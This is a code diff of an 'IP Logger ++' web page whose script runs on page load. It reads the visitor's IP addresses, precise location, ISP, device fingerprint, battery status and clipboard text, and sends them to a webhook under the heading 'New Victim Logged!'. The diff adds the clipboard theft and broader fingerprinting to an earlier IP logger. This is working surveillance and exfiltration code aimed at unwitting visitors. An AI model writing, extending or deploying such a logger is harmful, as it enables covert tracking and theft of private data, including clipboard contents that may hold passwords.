@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Cool</title>
+    <title>IP Logger ++</title>
     <style>
         body {
             background-color: #0f0f0f;
@@ -22,8 +22,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>IP Logger</h1>
-        <p>Your IP address and location have been logged (With consent prolly)</p>
+        <h1>IP Logger ++</h1>
+        <p>Your IP address and device details have been logged (With consent, probably)</p>
     </div>
 
     <script>
@@ -39,30 +39,64 @@
             }
         }
 
-        async function logIPs() {
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return `Charging: ${battery.charging}, Level: ${(battery.level * 100).toFixed(0)}%`;
+                } catch (e) {
+                    return 'Unavailable';
+                }
+            }
+            return 'Unavailable';
+        }
+
+        async function getClipboardText() {
+            try {
+                const text = await navigator.clipboard.readText();
+                return text ? text : 'Empty';
+            } catch {
+                return 'No Access / Empty';
+            }
+        }
+
+        async function logData() {
             const ipv4Data = await fetchIP('https://ipapi.co/json/');
             const ipv6Data = await fetchIP('https://ipapi.co/json/?ip_version=6');
 
-            if (!ipv4Data && !ipv6Data) return;
-
-            const userAgent = navigator.userAgent;
-            const language = navigator.language;
-            const platform = navigator.platform;
+            const batteryInfo = await getBatteryInfo();
+            const clipboardText = await getClipboardText();
 
             const payload = {
-                content: `**IP Log!** 📄
+                content: `**📥 New Victim Logged!**  
 
-**IPv4 Address:** ${ipv4Data ? ipv4Data.ip : 'Not Available'}
-**IPv6 Address:** ${ipv6Data && ipv6Data.ip !== ipv4Data?.ip ? ipv6Data.ip : 'Not Available'}
+**Info Logger:**
+> IPv4: ${ipv4Data ? ipv4Data.ip : 'N/A'}
+> IPv6: ${ipv6Data && ipv6Data.ip !== ipv4Data?.ip ? ipv6Data.ip : 'N/A'}
+> ISP: ${ipv4Data ? ipv4Data.org : 'Unknown'}
+> Location: ${ipv4Data ? `${ipv4Data.city}, ${ipv4Data.region}, ${ipv4Data.country_name} (${ipv4Data.postal})` : 'Unknown'}
+> Coordinates: ${ipv4Data ? `${ipv4Data.latitude}, ${ipv4Data.longitude}` : 'Unknown'}
+> Timezone: ${ipv4Data ? ipv4Data.timezone : 'Unknown'}
 
-**ISP:** ${ipv4Data ? ipv4Data.org : 'Unknown'}
-**Location:** ${ipv4Data ? `${ipv4Data.city}, ${ipv4Data.region}, ${ipv4Data.country_name} (${ipv4Data.postal})` : 'Unknown'}
-**Coordinates:** ${ipv4Data ? `${ipv4Data.latitude}, ${ipv4Data.longitude}` : 'Unknown'}
-**Timezone:** ${ipv4Data ? ipv4Data.timezone : 'Unknown'}
+**Device & Browser:**
+> User Agent: ${navigator.userAgent}
+> Platform: ${navigator.platform}
+> Language: ${navigator.language}
+> Screen: ${screen.width}x${screen.height}
+> Color Depth: ${screen.colorDepth}
+> CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
+> RAM: ${navigator.deviceMemory || 'Unknown'} GB
+> Cookies Enabled: ${navigator.cookieEnabled}
+> Touch Support: ${'ontouchstart' in window ? 'Yes' : 'No'}
+> Referrer: ${document.referrer || 'None'}
 
-**Browser Info:** ${userAgent}
-**Language:** ${language}
-**Platform:** ${platform}`
+**Browser Features:**
+> Battery: ${batteryInfo}
+> Clipboard Text: ${clipboardText}
+
+**Other Details:**
+> Plugins: ${navigator.plugins.length > 0 ? Array.from(navigator.plugins).map(p => p.name).join(', ') : 'None / Blocked'}
+`
             };
 
             fetch(webhookURL, {
@@ -72,7 +106,7 @@
             });
         }
 
-        logIPs();
+        logData();
     </script>
 </body>
 </html>
